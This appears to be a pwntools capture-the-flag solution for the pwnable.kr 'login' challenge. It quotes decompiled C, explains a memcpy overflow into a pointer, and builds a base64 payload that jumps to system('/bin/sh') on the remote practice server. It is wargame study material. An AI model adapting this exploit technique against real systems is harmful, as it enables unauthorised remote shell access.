from pwn import *
from base64 import b64encode

"""
bool auth(size_t param_1)

{
  int iVar1;
  undefined local_18 [8];
  char *local_10;
  undefined auStack12 [8];

  /* // we overflow into the char pointer with the memcpy as we can write 12 bytes into
       auStack12 */
  memcpy(auStack12,input,param_1);
  local_10 = (char *)calc_md5(local_18,0xc);
  printf("hash : %s\n",local_10);
  iVar1 = strcmp("f87cd601aa7fedca99018a8be88eda34",local_10);
  return iVar1 == 0;
}

void correct(void)

{
  if (input._0_4_ == -559038737) {
    puts("Congratulation! you are good!");
    system("/bin/sh");  // 0x8049278 is right here, and that's where we gonna jmp
  }
  exit(0);
}

"""

### 0x8049278 is just right after the check input[0:4] == 0xdeadbeef
### so we bypass it and jump right into the shell with a single byte overwrite of the char*
our_input = p32(0x8049278) + b"2235\x2c"
authcode = b64encode(our_input)

while 1:
    #p = process("./login")
    p = remote("pwnable.kr", 9003)
    p.sendlineafter("Authenticate :", authcode)
    data = p.recvuntil(b"\n")
    try:
        data = p.recvuntil(b"\n")
        print(data)
        if b"Congratulation! you are good!" in data:
            p.interactive()
            break
        else:
            continue
    except:
        continue


